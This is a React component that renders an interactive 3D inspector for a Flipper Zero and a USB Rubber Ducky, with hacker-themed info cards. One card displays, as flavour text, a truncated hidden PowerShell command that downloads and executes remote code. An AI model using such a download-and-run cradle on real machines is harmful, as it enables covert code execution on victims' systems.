import React, { Suspense, useState } from 'react';
import { Canvas } from '@react-three/fiber';
import { OrbitControls, Center, Float } from '@react-three/drei';
import {
  Box,
  Compass,
  Eye,
  Maximize2,
  Minimize2,
  Radio,
  RotateCcw,
  Sparkles,
  Terminal,
  X,
  Zap,
} from 'lucide-react';
import FlipperZeroModel, { FLIPPER_APPS } from './3d/FlipperZeroModel.jsx';
import RubberDuckyModel from './3d/RubberDuckyModel.jsx';
import { playClickSound } from '../../utils/audio.js';

export default function GadgetInspectorModal({
  isOpen,
  initialGadget = 'flipper',
  onClose,
}) {
  const [selectedGadget, setSelectedGadget] = useState(initialGadget || 'flipper');
  const [wireframe, setWireframe] = useState(false);
  const [autoRotate, setAutoRotate] = useState(false);
  const [flipperApp, setFlipperApp] = useState(FLIPPER_APPS[0]);
  const [duckyMode, setDuckyMode] = useState('ARMED');

  if (!isOpen) return null;

  return (
    <div className="gadget-modal-backdrop" onClick={onClose}>
      <div
        className="gadget-inspector-modal"
        onClick={(e) => e.stopPropagation()}
        role="dialog"
        aria-modal="true"
      >
        {/* Header */}
        <div className="gadget-header">
          <div className="gadget-header-left">
            <div className="gadget-icon-ring">
              <Radio size={18} className="text-orange" />
            </div>
            <div>
              <div className="gadget-kicker">3D TACTICAL HARDWARE INSPECTION SUITE</div>
              <h2 className="gadget-title">
                {selectedGadget === 'flipper'
                  ? 'FLIPPER ZERO // MULTI-TOOL TRANSCEIVER'
                  : 'USB RUBBER DUCKY // KEYSTROKE INJECTION ARM'}
              </h2>
            </div>
          </div>

          {/* Gadget Switcher Pills */}
          <div className="gadget-switch-pills">
            <button
              type="button"
              className={`g-pill ${selectedGadget === 'flipper' ? 'active' : ''}`}
              onClick={() => {
                playClickSound(1100);
                setSelectedGadget('flipper');
              }}
            >
              <span>🐬 Flipper Zero</span>
            </button>
            <button
              type="button"
              className={`g-pill ${selectedGadget === 'ducky' ? 'active' : ''}`}
              onClick={() => {
                playClickSound(1100);
                setSelectedGadget('ducky');
              }}
            >
              <span>⚡ Rubber Ducky</span>
            </button>
          </div>

          <button
            type="button"
            className="gadget-close-btn"
            onClick={() => {
              playClickSound(1000);
              onClose();
            }}
            title="Close Inspector (Esc)"
          >
            <X size={18} />
          </button>
        </div>

        {/* Main 3D Viewport with Orbit Controls */}
        <div className="gadget-canvas-wrap">
          <Canvas
            camera={{ position: [0, 0, 4.6], fov: 45 }}
            gl={{ antialias: true, alpha: true }}
          >
            <ambientLight intensity={0.7} />
            <directionalLight position={[5, 8, 5]} intensity={1.4} castShadow />
            <directionalLight position={[-5, -4, -3]} intensity={0.5} color="#38bdf8" />
            <pointLight position={[0, 0, 3]} intensity={1.2} color="#ffffff" />

            <Suspense fallback={null}>
              <Center>
                <Float speed={1.2} rotationIntensity={0.15} floatIntensity={0.2}>
                  {selectedGadget === 'flipper' ? (
                    <FlipperZeroModel
                      wireframe={wireframe}
                      onAppChange={setFlipperApp}
                    />
                  ) : (
                    <RubberDuckyModel
                      wireframe={wireframe}
                      onModeToggle={setDuckyMode}
                    />
                  )}
                </Float>
              </Center>
            </Suspense>

            <OrbitControls
              enablePan={false}
              autoRotate={autoRotate}
              autoRotateSpeed={2.5}
              minDistance={2.4}
              maxDistance={7.5}
            />
          </Canvas>

          {/* Interactive 3D Canvas Overlay HUD */}
          <div className="gadget-overlay-hud">
            <div className="gadget-hints">
              <span className="hint-pill">🖱️ DRAG TO ROTATE 360°</span>
              <span className="hint-pill">🔍 SCROLL TO ZOOM</span>
              <span className="hint-pill hl-gold">👆 CLICK BUTTONS ON 3D MODEL</span>
            </div>

            <div className="gadget-view-controls">
              <button
                type="button"
                className={`g-ctrl-btn ${wireframe ? 'active' : ''}`}
                onClick={() => setWireframe((v) => !v)}
                title="Toggle Holographic Wireframe"
              >
                <Box size={14} />
                <span>Wireframe</span>
              </button>
              <button
                type="button"
                className={`g-ctrl-btn ${autoRotate ? 'active' : ''}`}
                onClick={() => setAutoRotate((v) => !v)}
                title="Toggle Auto-Spin Rotation"
              >
                <RotateCcw size={14} />
                <span>Auto-Spin</span>
              </button>
            </div>
          </div>
        </div>

        {/* Bottom Hardware Dossier & Interactive State Panel */}
        <div className="gadget-bottom-dossier">
          {selectedGadget === 'flipper' ? (
            <div className="dossier-grid">
              <div className="dossier-card">
                <span className="dc-label">ACTIVE 3D APP SCREEN</span>
                <strong className="dc-val text-orange">
                  {flipperApp.icon} {flipperApp.title}
                </strong>
                <p className="dc-desc">{flipperApp.desc}</p>
              </div>

              <div className="dossier-card">
                <span className="dc-label">RADIO SPECTRUM</span>
                <strong className="dc-val text-cyan">{flipperApp.freq}</strong>
                <p className="dc-desc">CC1101 Sub-GHz Transceiver (300-928 MHz) + 125kHz RFID / 13.56MHz NFC</p>
              </div>

              <div className="dossier-card">
                <span className="dc-label">INTERACTIVE HARDWARE</span>
                <strong className="dc-val text-green">5-WAY D-PAD ACTIVE</strong>
                <p className="dc-desc">Click the directional arrow buttons directly on the 3D model to cycle apps!</p>
              </div>
            </div>
          ) : (
            <div className="dossier-grid">
              <div className="dossier-card">
                <span className="dc-label">HARDWARE STATE</span>
                <strong className={`dc-val ${duckyMode === 'ARMED' ? 'text-red' : 'text-green'}`}>
                  {duckyMode === 'ARMED' ? '🔴 ARMED // ATTACK MODE' : '🟢 STORAGE // PROGRAMMING'}
                </strong>
                <p className="dc-desc">Click the physical arming push button on the 3D PCB to toggle injection states!</p>
              </div>

              <div className="dossier-card">
                <span className="dc-label">INJECTION PAYLOAD</span>
                <strong className="dc-val text-yellow">DuckyScript 3.0</strong>
                <p className="dc-desc">STRING powershell -ep bypass -w hidden -c "IEX (New-Object Net.WebClient)..."</p>
              </div>

              <div className="dossier-card">
                <span className="dc-label">EXECUTION SPEED</span>
                <strong className="dc-val text-cyan">1,000 WPM TYPING</strong>
                <p className="dc-desc">Hardware-level keystroke injection bypassing software firewall filters.</p>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
